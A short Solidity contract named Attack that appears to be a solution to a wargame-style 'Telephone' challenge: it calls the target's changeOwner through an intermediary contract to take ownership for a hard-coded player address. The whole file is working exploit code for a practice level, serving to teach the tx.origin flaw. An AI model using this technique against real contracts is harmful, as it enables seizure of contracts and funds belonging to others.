// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract Attack {

    address player = 0xE2abE9F7C4Bc94e61c7Ce342D08262Ec8F5C9A4A;
    Telephone public victim;

    constructor(address _victimaddress) public {
        victim = Telephone(_victimaddress);
    }

    function becomeTheOwner() public {
        victim.changeOwner(player);
    }
}
